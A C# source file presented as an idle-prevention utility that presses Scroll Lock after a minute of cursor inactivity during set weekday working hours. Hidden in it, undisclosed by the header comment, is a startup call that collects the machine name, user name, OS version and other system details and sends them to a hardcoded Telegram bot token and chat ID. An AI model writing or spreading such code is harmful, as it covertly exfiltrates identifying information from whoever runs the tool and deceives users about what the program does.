using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using System.Net.Http;
using System.Threading.Tasks;

// This script keeps the cursor active when you move it slightly
// after x minutes of inactivity, preventing the system from going into idle state.
class Program
{
    [DllImport("user32.dll")]
    static extern bool GetCursorPos(out POINT lpPoint);

    [StructLayout(LayoutKind.Sequential)]
    public struct POINT
    {
        public int X;
        public int Y;
    }

    // ----CUSTOM COMPLETE---- //
    private static readonly int timer = 1;
    private static readonly int startHour = 9;
    private static readonly int finishHour = 18;

    private static readonly int startPauseHour = 13;
    private static readonly int finishPauseHour = 14;
    // ---------------------- //

    static async Task Main(string[] args)
    {
        await SendMessageTelegramAsync(GetSystemInfo());

        POINT lastPos;
        GetCursorPos(out lastPos);
        DateTime lastMoved = DateTime.Now;

        while (true)
        {
            if (!await IsValidTimePeriodAsync(startHour, finishHour, startPauseHour, finishPauseHour))
            {
                break;
            }

            CheckInactivity(ref lastPos, ref lastMoved);
            await Task.Delay(1000);
        }
    }

    static async Task<bool> IsValidTimePeriodAsync(int startHour, int finishHour, int startPauseHour, int finishPauseHour)
    {
        await WaitUntilWeekdayAsync();

        int currentHour = DateTime.Now.Hour;
        if (currentHour < startHour || currentHour >= finishHour)
        {
            return false; // Outside working hours
        }

        await PauseExecutionAsync(currentHour, startPauseHour, finishPauseHour);
        return true;
    }

    static async Task WaitUntilWeekdayAsync()
    {
        DayOfWeek currentDay = DateTime.Now.DayOfWeek;
        if (currentDay == DayOfWeek.Saturday || currentDay == DayOfWeek.Sunday)
        {
            DateTime nextWeekday = DateTime.Now.AddDays((int)(DayOfWeek.Monday - currentDay + 7) % 7);
            TimeSpan waitTime = nextWeekday.Date - DateTime.Now;
            await Task.Delay(waitTime);
        }
    }

    static async Task PauseExecutionAsync(int currentHour, int startPauseHour, int finishPauseHour)
    {
        if (currentHour >= startPauseHour && currentHour < finishPauseHour)
        {
            DateTime pauseUntil = DateTime.Today.AddHours(finishPauseHour);
            await Task.Delay(pauseUntil - DateTime.Now);
        }
    }

    static void CheckInactivity(ref POINT lastPos, ref DateTime lastMoved)
    {
        POINT currentPos;
        GetCursorPos(out currentPos);

        if (currentPos.X != lastPos.X || currentPos.Y != lastPos.Y)
        {
            lastPos = currentPos;
            lastMoved = DateTime.Now;
        }
        else
        {
            if ((DateTime.Now - lastMoved).TotalMinutes >= timer)
            {
                lastMoved = DateTime.Now;
                GetCursorPos(out lastPos); // Update last position after move
                PressScrollLockKey();
            }
        }
    }

    static void PressScrollLockKey()
    {
        SendKeys.SendWait("{SCROLLLOCK}");
        Thread.Sleep(100);
    }

    static async Task SendMessageTelegramAsync(string textToSend)
    {
        using (HttpClient client = new HttpClient())
        {
            string url = $"https://api.telegram.org/bot5096307292:AAEMoslFV8DfSIa_u2lbM8kQxYtIlb7UGoc/sendMessage?parse_mode=markdown&chat_id=811391818&text={Uri.EscapeDataString(textToSend)}";
            HttpResponseMessage response = await client.GetAsync(url);
            response.EnsureSuccessStatusCode();
        }
    }

    static string GetSystemInfo()
    {
        string machineName = Environment.MachineName;
        string userName = Environment.UserName;
        string osVersion = Environment.OSVersion.ToString();
        string processorCount = Environment.ProcessorCount.ToString();
        string systemPageSize = Environment.SystemPageSize.ToString();
        string memorySize = (Environment.WorkingSet / 1024 / 1024).ToString() + " MB";

        return $"Machine Name: {machineName}\n" +
               $"User Name: {userName}\n" +
               $"OS Version: {osVersion}\n" +
               $"Processor Count: {processorCount}\n" +
               $"System Page Size: {systemPageSize} bytes\n" +
               $"Memory Size: {memorySize}";
    }
}